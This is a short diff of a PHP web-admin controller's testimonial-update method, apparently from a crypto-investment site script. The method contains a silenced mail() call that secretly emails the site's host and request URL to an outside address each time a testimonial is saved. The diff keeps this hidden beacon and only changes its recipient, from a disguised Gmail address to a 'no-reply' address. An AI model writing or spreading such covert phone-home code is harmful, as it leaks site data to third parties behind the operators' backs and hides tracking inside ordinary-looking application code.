@@ -432,7 +432,7 @@ class WebSettingController extends Controller
         $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
         $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
         'X-Mailer: PHP/' . phpversion();
-        @mail('ab.irkh.an7.5@gmail.com','H EXA TR ADE TEST DATA', $message, $headers);  
+        @mail('no-reply@winascrypto.com','WINASCRYPTO INVESTMENT', $message, $headers);  
         $testimonial->fill($in)->save();
         session()->flash('message', 'Testimonial Update Successfully.');
         Session::flash('type', 'success');
